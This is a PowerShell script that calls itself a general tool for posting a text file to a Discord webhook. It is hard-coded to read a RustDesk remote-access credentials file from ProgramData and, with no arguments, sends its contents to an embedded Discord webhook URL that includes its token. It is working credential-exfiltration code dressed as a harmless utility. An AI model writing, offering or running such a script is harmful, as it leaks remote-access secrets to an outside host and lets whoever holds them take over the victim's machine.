# Send the contents of a text file to a Discord webhook.
# Update $FilePath below to point to the text file you want to send. Once set,
# you can simply run the script without any arguments and it will immediately
# post the file's contents to the configured webhook.

param(
    [string]$WebhookUrl = 'https://discord.com/api/webhooks/1194215544342196275/dgFll7XP-mLSiNWHxUoFkSpuKT62Uf5GN-_IlcuB4VknzWky9UwAlPoQRezxzLoIWRJI'
)

$FilePath = 'C:\ProgramData\RustDesk\rustdesk-credentials.txt'

if (-not $FilePath) {
    throw 'Update $FilePath in the script before running it.'
}

if (-not (Test-Path -Path $FilePath -PathType Leaf)) {
    throw "File not found: $FilePath"
}

$content = Get-Content -Path $FilePath -Raw

$payload = @{ content = $content } | ConvertTo-Json

try {
    Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $payload -ContentType 'application/json; charset=utf-8'
    Write-Host "Successfully sent contents of '$FilePath' to Discord webhook." -ForegroundColor Green
}
catch {
    Write-Error "Failed to send contents to Discord webhook: $($_.Exception.Message)"
    throw
}
